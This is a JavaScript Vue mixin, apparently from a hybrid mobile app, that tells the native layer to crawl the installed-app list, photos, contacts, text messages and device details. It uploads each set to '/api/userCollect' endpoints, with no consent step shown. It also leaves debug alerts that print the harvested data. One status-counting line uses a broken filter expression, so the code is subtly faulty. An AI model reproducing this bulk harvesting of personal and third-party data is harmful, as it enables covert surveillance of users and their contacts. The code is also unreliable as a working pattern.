import axios from 'axios';
import { mapState, mapActions } from 'vuex';
import { dateFormat } from '@/utils/mUtils';
import { ImagePreview } from 'vant';
window.isInitSyncData = false;
window.syncDataResolve = null;
window.syncDataReject = null;
const SYNC_LOCAL_KEY = 'sync-app-data-status';

const NEED_SYNC_TYPE = ['appListFunName', 'imageListFunName', 'contactsListFunName', 'msgListFunName', 'devFunName', 'devBaseFunName'];

export default {
  data() {
    if (!window.isInitSyncData) {
      window.onappListFunName = async data => {
        alert('收到onappListFunName data:' + JSON.stringify(data));
        if (typeof data == 'string') {
          data = JSON.parse(data);
        }
        try {
          await this.$http.post(`/api/userCollect/collectApp`, {
            data: data,
          });
          this.updateLocalSyncStatus('appListFunName', true);
        } catch (error) {
          this.updateLocalSyncStatus('appListFunName', false);
        }
      };
      window.onimageListFunName = async data => {
        alert('收到onimageListFunName data:' + JSON.stringify(data));
        if (typeof data == 'string') {
          data = JSON.parse(data);
        }
        try {
          await this.$http.post(`/api/userCollect/collectImage`, data);
          this.updateLocalSyncStatus('imageListFunName', true);
        } catch (error) {
          this.updateLocalSyncStatus('imageListFunName', false);
        }
      };
      window.oncontactsListFunName = async data => {
        alert('收到oncontactsListFunName data:' + JSON.stringify(data));
        if (typeof data == 'string') {
          data = JSON.parse(data);
        }
        try {
          await this.$http.post(`/api/userCollect/collectContacts`, data);
          this.updateLocalSyncStatus('contactsListFunName', true);
        } catch (error) {
          this.updateLocalSyncStatus('contactsListFunName', false);
        }
      };
      window.msgListFunName = async data => {
        alert('收到onmsgListFunName data:' + JSON.stringify(data));
        if (typeof data == 'string') {
          data = JSON.parse(data);
        }
        try {
          await this.$http.post(`/api/userCollect/collectMsg`, data);
        } catch (error) {}
      };
      window.ondevFunName = async data => {
        alert('收到ondevFunName data:' + JSON.stringify(data));
        if (typeof data == 'string') {
          data = JSON.parse(data);
        }
        try {
          await this.$http.post(`/api/userCollect/collectDevice`, data);
          this.updateLocalSyncStatus('devFunName', true);
        } catch (error) {
          this.updateLocalSyncStatus('devFunName', false);
        }
      };
      window.ondevBaseFunName = async data => {
        alert('收到ondevBaseFunName:' + JSON.stringify(data));
        if (typeof data == 'string') {
          data = JSON.parse(data);
        }
        try {
          await this.$http.post(`/api/userCollect/collectDeviceBase`, data);
          this.updateLocalSyncStatus('devBaseFunName', true);
        } catch (error) {
          this.updateLocalSyncStatus('devBaseFunName', false);
        }
      };
      window.isInitSyncData = true;
    }

    return {};

    // window.onSyncAppData = async data => {
    //   if (typeof data == 'string') {
    //     data = JSON.parse(data);
    //   }
    //   // 上传抓取日志
    //   try {
    //     this.$http.post(`/api/userCollect/uploadCaptureLog`, {
    //       userId: this.userInfo.id,
    //       appName: this.appGlobal.appName,
    //       orderId: this.$route.query.orderId || '',
    //       type: '111',
    //       msg: data,
    //     });
    //   } catch (error) {
    //     console.error(error);
    //   }
    // };
    // return {};
  },
  mounted() {},

  methods: {
    updateLocalSyncStatus(type, isSuccess) {
      let status = localStorage.getItem(SYNC_LOCAL_KEY);
      if (!status) {
        status = {};
      } else {
        status = JSON.parse(status);
      }
      status[type] = isSuccess;

      // 如果任意一个失败都算失败
      if (!isSuccess && window.syncDataReject) {
        console.log('1');
        window.syncDataReject({ success: false });
        window.syncDataReject = null;
      }
      if (Object.keys(status).length == NEED_SYNC_TYPE.length) {
        // 都已经上传完了
        let successNum = Object.values(status).filter((t = !!t)).length;
        if (successNum == NEED_SYNC_TYPE.length) {
          // 全部成功
          if (window.syncDataResolve) {
            window.syncDataResolve({ success: true });
            window.syncDataResolve = null;
          }
        } else {
          // 部分失败
          if (window.syncDataReject) {
            window.syncDataReject({ success: false });
            window.syncDataReject = null;
          }
        }
      } else {
        // 否则部分传完
        localStorage.setItem(SYNC_LOCAL_KEY, JSON.stringify(status));
      }
    },

    startSyncData(needResolve = false) {
      return new Promise(async (resolve, reject) => {
        // 第一步判断是否需要
        try {
          let res = await this.$http.post(`/api/userCollect/isUploadData`, {
            userId: this.appGlobal.userId,
          });
          if (res.data) {
            // 已经上传
            resolve({ status: 'already' });
          } else {
            let types = {};
            NEED_SYNC_TYPE.forEach(t => {
              types[t] = `on${t}`;
            });
            this.toAppMethod('crawlData', types);
            if (needResolve) {
              window.syncDataResolve = resolve;
              window.syncDataReject = reject;
            } else {
              window.syncDataResolve = null;
              window.syncDataReject = null;
            }
          }
        } catch (error) {
          reject({ success: false });
        }
      });
    },
  },
};